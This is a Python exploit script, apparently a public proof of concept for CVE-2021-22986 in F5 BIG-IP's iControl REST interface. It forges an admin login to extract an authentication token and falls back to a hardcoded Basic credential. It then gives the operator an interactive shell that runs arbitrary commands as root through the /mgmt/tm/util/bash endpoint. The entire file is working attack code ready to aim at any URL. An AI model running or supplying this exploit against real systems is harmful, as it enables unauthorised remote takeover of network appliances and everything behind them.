import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys


def title():
    print('''
      ______ ____    ____  _______       ___     ___    ___    __        ___    ___     ___     ___      __   
     /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  /_ |      |__ \  |__ \   / _ \   / _ \    / /   
    |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) |  | |  ______ ) |    ) | | (_) | | (_) |  / /_   
    |  |       \      /   |   __|  |______/ /  | | | |   / /   | | |______/ /    / /   \__, |  > _ <  | '_ \  
    |  `----.   \    /    |  |____       / /_  | |_| |  / /_   | |       / /_   / /_     / /  | (_) | | (_) | 
     \______|    \__/     |_______|     |____|  \___/  |____|  |_|      |____| |____|   /_/    \___/   \___/                                                                                                                                                                             
    
                                Author:Al1ex@Heptagram
                                Github:https://github.com/Al1ex
    ''')   

def exploit(url):
	target_url = url + '/mgmt/shared/authn/login'
	data = {
		"bigipAuthCookie":"",
		"username":"admin",
		"loginReference":{"link":"/shared/gossip"},
		"userReference":{"link":"https://localhost/mgmt/shared/authz/users/admin"}
	}
	headers = {
		"User-Agent": "hello-world",
		"Content-Type":"application/x-www-form-urlencoded"
	}
	response = requests.post(target_url, headers=headers, json=data, verify=False, timeout=15)
	if "/mgmt/shared/authz/tokens/" not in response.text:
		print('(-) Get token fail !!!')
		print('(*) Tested Method 2:') 
		header_2 = {
		    'User-Agent': 'hello-world',
		    'Content-Type': 'application/json',
		    'X-F5-Auth-Token': '',
		    'Authorization': 'Basic YWRtaW46QVNhc1M='
		}
		data_2 = {
			"command": "run", 
			"utilCmdArgs": "-c whoami"
		}
		check_url = url + '/mgmt/tm/util/bash'
		try:
			response2 = requests.post(url=check_url, json=data_2, headers=header_2, verify=False, timeout=20)
			if response2.status_code == 200 and 'commandResult' in response2.text:
				while True:
					cmd = input("(:CMD)> ")
					data_3 = {"command": "run", "utilCmdArgs": "-c '%s'"%(cmd)}
					r = requests.post(url=check_url, json=data_3, headers=header_2, verify=False)
					if r.status_code == 200 and 'commandResult' in r.text:
						print(r.text.split('commandResult":"')[1].split('"}')[0].replace('\\n', ''))
			else:
				print('(-) Not vuln...')
				exit(0)
		except Exception:
			print('ERROR Connect')
	print('(+) Extract token: %s'%(response.text.split('"selfLink":"https://localhost/mgmt/shared/authz/tokens/')[1].split('"}')[0]))
	while True:
		cmd = input("(:CMD)> ")
		headers = {
			"Content-Type": "application/json",
			"X-F5-Auth-Token": "%s"%(response.text.split('"selfLink":"https://localhost/mgmt/shared/authz/tokens/')[1].split('"}')[0])
		}
		data_json = {
			"command": "run", 
			"utilCmdArgs": "-c \'%s\'"%(cmd)
		}
		exp_url= url + '/mgmt/tm/util/bash'
		exp_req = requests.post(exp_url, headers=headers, json=data_json, verify=False, timeout=15)
		if exp_req.status_code == 200 and 'commandResult' in exp_req.text:
			print(exp_req.text.split('commandResult":"')[1].split('"}')[0].replace('\\n', ''))
		else:
			print('(-) Not vuln...')
			exit(0)

if __name__ == '__main__':
    title()
    if(len(sys.argv) < 2):
    	print('[+] USAGE: python3 %s https://<target_url>\n'%(sys.argv[0]))
    	exit(0)
    else:
    	exploit(sys.argv[1])